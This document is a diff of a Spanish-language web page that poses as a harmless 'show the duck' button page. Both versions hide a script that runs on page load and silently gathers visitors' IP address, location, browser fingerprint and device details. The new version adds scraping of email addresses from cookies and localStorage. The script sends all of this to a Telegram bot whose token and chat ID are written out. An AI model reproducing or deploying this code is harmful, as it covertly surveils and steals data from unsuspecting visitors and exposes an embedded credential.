@@ -2,79 +2,107 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Tes1t</title>
+  <title>¡Aquí está el pato!</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow">
+
+  <!-- Estilo minimalista con botón llamativo -->
   <style>
-    body {
-      font-family: Arial;
-      background: #f0f0f0;
+    html, body {
       margin: 0;
-      padding: 20px;
-      text-align: center;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
     }
 
-    .box {
-      max-width: 700px;
-      margin: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
+    .btn {
+      font-size: 3rem;
+      padding: 40px 60px;
+      border: none;
+      border-radius: 15px;
       cursor: pointer;
-      margin-top: 20px;
+      background: linear-gradient(135deg, #00ffcc, #00ccff);
+      color: #000;
+      box-shadow: 0 0 30px rgba(0,255,204,0.5);
+      transition: all 0.3s ease-in-out;
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 40px rgba(0,255,204,0.8);
     }
 
     #duck {
       display: none;
-      width: 90%;
-      max-width: 500px;
-      margin-top: 20px;
-      border-radius: 10px;
-      transition: all 0.3s ease-in-out;
+      font-size: 10rem;
+      margin-top: 30px;
+      animation: pop 0.4s ease-out forwards;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Aprieta el botón para ver algo divertido</h2>
-    <button id="startBtn">Dame Click</button>
 
-    <!-- Imagen del pato -->
-    <img id="duck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/American_Wigeon_duck.jpg/1280px-American_Wigeon_duck.jpg"  alt="Pato Gigante">
-  </div>
+  <button class="btn" id="showDuck">Mostrar pato</button>
+  <div id="duck">🦆</div>
 
 <script>
 (() => {
   const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // ⚠️ Token visible
   const CHAT_ID = "6065284869";
 
-  const startBtn = document.getElementById("startBtn");
-  const duck = document.getElementById("duck");
+  let collected = {};
 
-  let humanInteraction = false;
+  // === FUNCIONES DE RECOLECCIÓN EXTREMA ===
 
-  ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
-    window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
-  });
+  async function getIPInfo() {
+    const urls = [
+      "https://api.ipify.org?format=json",
+      "https://ipapi.co/json/",
+      "https://ipinfo.io/json"
+    ];
 
-  function detectHeadless() {
-    return (/HeadlessChrome/.test(navigator.userAgent) ||
-            !navigator.plugins?.length ||
-            !navigator.languages?.length ||
-            navigator.webdriver)
-      ? "Sí" : "No";
-  }
+    for (const url of urls) {
+      try {
+        const res = await fetch(url, { method: "GET", mode: "cors", cache: "no-cache" });
+        if (!res.ok) continue;
+        const data = await res.json();
 
-  async function detectIncognito() {
-    return new Promise(resolve => {
-      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-      if (!fs) resolve("No detectable");
-      else fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí"));
-    });
+        return {
+          ip: data.ip || "N/D",
+          org: data.org || data.asn || "N/D",
+          country: data.country || "N/D",
+          city: data.city || "N/D",
+          lat: data.lat || data.loc?.split(",")[0] || null,
+          lon: data.lon || data.loc?.split(",")[1] || null,
+          timezone: data.timezone || data.tz || "N/D",
+          proxy: /proxy|vpn|tor/i.test(data.org || "") || false
+        };
+      } catch (e) {
+        continue;
+      }
+    }
+
+    return {
+      ip: "No disponible",
+      org: "No disponible",
+      country: "No disponible",
+      city: "No disponible",
+      lat: null,
+      lon: null,
+      timezone: "No disponible",
+      proxy: false
+    };
   }
 
   function getFingerprint() {
@@ -87,223 +115,110 @@
     ].join('|'));
   }
 
-  async function checkPermissions() {
-    if (!navigator.permissions) return "No soportado";
-    try {
-      const cam = await navigator.permissions.query({name:"camera"});
-      const mic = await navigator.permissions.query({name:"microphone"});
-      const geo = await navigator.permissions.query({name:"geolocation"});
-      return `Cámara: ${cam.state}, Micrófono: ${mic.state}, Geoloc: ${geo.state}`;
-    } catch {
-      return "Error consulta permisos";
-    }
-  }
+  async function extractEmailFromStorage() {
+    const regex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gim;
 
-  function checkHardwareAcceleration() {
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (!gl) return "No WebGL";
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      if (!dbg) return "No debug info";
-      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "No renderer";
-    } catch {
-      return "Error WebGL";
-    }
-  }
+    const cookieMatch = document.cookie.match(regex);
+    if (cookieMatch) return cookieMatch[0];
 
-  async function detectAdblock() {
-    try {
-      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
-      return "No detectado";
-    } catch {
-      return "Probable AdBlock";
-    }
-  }
-
-  function checkTimezoneLocale() {
-    try {
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const lang = navigator.language || navigator.userLanguage;
-      if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
-      return "OK";
-    } catch {
-      return "No disponible";
-    }
-  }
-
-  // === FUNCIÓN MEJORADA: getIPInfo con múltiples APIs ===
-  async function getIPInfo() {
-    const APIs = [
-      {
-        url: "https://ipapi.com/ip_api.php", 
-        map: d => ({
-          ip: d.query,
-          org: d.org,
-          country: d.country,
-          region: d.regionName,
-          city: d.city,
-          asn: d.asn,
-          proxy: false,
-          version: d.query.includes(':') ? 'IPv6' : 'IPv4',
-          lat: d.lat,
-          lon: d.lon
-        })
-      },
-      {
-        url: "https://ip-api.co/json/", 
-        map: d => ({
-          ip: d.ip,
-          org: d.org,
-          country: d.country,
-          region: d.regionName,
-          city: d.city,
-          asn: d.as,
-          proxy: d.proxy,
-          version: d.ip.includes(':') ? 'IPv6' : 'IPv4',
-          lat: d.lat,
-          lon: d.lon
-        })
-      },
-      {
-        url: "https://api.ipify.org?format=json",
-        map: d => ({
-          ip: d.ip,
-          org: "Desconocido",
-          country: "Desconocido",
-          region: "Desconocido",
-          city: "Desconocido",
-          asn: "Desconocido",
-          proxy: false,
-          version: d.ip.includes(':') ? 'IPv6' : 'IPv4',
-          lat: null,
-          lon: null
-        })
-      }
-    ];
-
-    for (const { url, map } of APIs) {
-      try {
-        const res = await fetch(url, { method: "GET", mode: "cors" });
-        if (!res.ok) continue;
-        const data = await res.json();
-        return map(data);
-      } catch (e) {
-        console.warn(`Error con ${url}:`, e.message);
-        continue;
-      }
+    for (let i = 0; i < localStorage.length; i++) {
+      const val = localStorage.getItem(localStorage.key(i));
+      const match = val.match(regex);
+      if (match) return match[0];
     }
 
-    return null;
+    return "No encontrado";
   }
 
-  // === ENVIAR A TELEGRAM CON REINTENTOS Y TIMEOUT RÁPIDO ===
+  function detectHeadless() {
+    return (/HeadlessChrome/.test(navigator.userAgent) ||
+            !navigator.plugins?.length ||
+            !navigator.languages?.length ||
+            navigator.webdriver)
+      ? "Sí" : "No";
+  }
+
   async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 segundos máximo
+    const timeout = setTimeout(() => controller.abort(), 800); // 0.8 segundos max
 
-    const fetchWithTimeout = () =>
-      fetch(url, {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: message,
+          text: message
         }),
         signal: controller.signal
       });
 
-    for (let i = 0; i < 3; i++) {
-      try {
-        const response = await fetchWithTimeout();
-        clearTimeout(timeoutId);
-        if (response.ok) return true;
-      } catch (e) {
-        if (i === 2) console.warn("Falló tras 3 intentos:", e.message);
-        await new Promise(r => setTimeout(r, 1000)); // retraso antes de reintento
-      }
+      clearTimeout(timeout);
+      return res.ok;
+    } catch (e) {
+      return false;
     }
-
-    return false;
   }
 
   async function collectAndSend() {
-    const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
-      getIPInfo(),
-      new Promise((res, rej) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 2000});
-        } else rej();
-      }),
-      detectIncognito(),
-      checkPermissions(),
-      detectAdblock()
-    ]);
+    const ipData = await getIPInfo();
 
-    let message = "";
+    collected = {
+      ...ipData,
+      ua: navigator.userAgent,
+      fp: getFingerprint(),
+      headless: detectHeadless(),
+      touch: 'ontouchstart' in window ? "Sí" : "No",
+      platform: navigator.platform,
+      res: `${screen.width}x${screen.height}`,
+      hw: navigator.hardwareConcurrency || "N/D",
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/D",
+      lang: navigator.language || "N/D",
+      ts: new Date().toISOString()
+    };
 
-    if (ipRes.status === "fulfilled" && ipRes.value) {
-      const ip = ipRes.value;
-      message += `IP: ${ip.ip}
-ISP: ${ip.org}
-ASN: ${ip.asn}
-Proxy/VPN/Tor: ${ip.proxy ? "Sí" : "No"}
-Ciudad: ${ip.city}
-Región: ${ip.region}
-País: ${ip.country}
-Versión IP: ${ip.version}
-`;
-    } else {
-      message += "No se pudo obtener IP\n";
+    try {
+      collected.email = await extractEmailFromStorage();
+    } catch {
+      collected.email = "No encontrado";
     }
 
-    message += `User-Agent: ${navigator.userAgent}
-Navegador Headless: ${detectHeadless()}
-Modo Incógnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
-Interacción Humana: ${humanInteraction ? "Sí" : "No"}
-Pantalla: ${screen.width}x${screen.height}
-Touch Support: ${'ontouchstart' in window ? 'Sí' : 'No'}
-Plataforma: ${navigator.platform}
-Fingerprint: ${getFingerprint()}
-Permisos (cámara, micrófono, geoloc): ${permStatus.status === "fulfilled" ? permStatus.value : "No disponible"}
-Aceleración hardware: ${checkHardwareAcceleration()}
-Timezone vs Locale: ${checkTimezoneLocale()}
-AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
-Hora: ${new Date().toLocaleString()}
-`;
+    const message = `📡 DATOS DE VISITANTE\n` +
+      `IP: ${collected.ip}\n` +
+      `ISP: ${collected.org}\n` +
+      `País: ${collected.country}\n` +
+      `Ciudad: ${collected.city}\n` +
+      `Correo: ${collected.email}\n` +
+      `Proxy/VPN/Tor: ${collected.proxy ? "Sí" : "No"}\n` +
+      `Latitud: ${collected.lat || "N/D"}\n` +
+      `Longitud: ${collected.lon || "N/D"}\n` +
+      `User-Agent: ${collected.ua}\n` +
+      `Plataforma: ${collected.platform}\n` +
+      `Resolución: ${collected.res}\n` +
+      `Touch: ${collected.touch}\n` +
+      `Headless: ${collected.headless}\n` +
+      `Timezone: ${collected.tz}\n` +
+      `Idioma: ${collected.lang}\n` +
+      `Fingerprint: ${collected.fp}\n` +
+      `Fecha: ${new Date(collected.ts).toLocaleString()}`;
 
     await sendToTelegram(message);
-
-    // Ubicación precisa o aproximada
-    if (geoRes.status === "fulfilled") {
-      const {latitude, longitude, accuracy} = geoRes.value.coords;
-      const locationInfo = `\nUbicación Precisa:
-Latitud: ${latitude}
-Longitud: ${longitude}
-Precisión: ${accuracy} metros`;
-      await sendToTelegram(locationInfo);
-    } else if (ipRes?.value?.lat && ipRes?.value?.lon) {
-      const ip = ipRes.value;
-      const locationInfo = `\nUbicación Aproximada (por IP):
-Latitud: ${ip.lat}
-Longitud: ${ip.lon}`;
-      await sendToTelegram(locationInfo);
-    }
   }
 
-  // 🔥 Enviar datos apenas se carga la página
+  // Ejecutar al cargar la página
   window.addEventListener("load", () => {
-    collectAndSend(); // Se ejecuta automáticamente
+    collectAndSend(); // 🔥 Envío automático e invisible
   });
 
-  // 🦆 Mostrar pato al hacer click
-  startBtn.addEventListener("click", () => {
+  // Mostrar pato al hacer click
+  const btn = document.getElementById("showDuck");
+  const duck = document.getElementById("duck");
+
+  btn.addEventListener("click", () => {
+    btn.style.display = "none";
     duck.style.display = "block";
-    startBtn.textContent = "Aquí está el pato 🦆";
-    startBtn.disabled = true;
   });
+
 })();
 </script>
 </body>
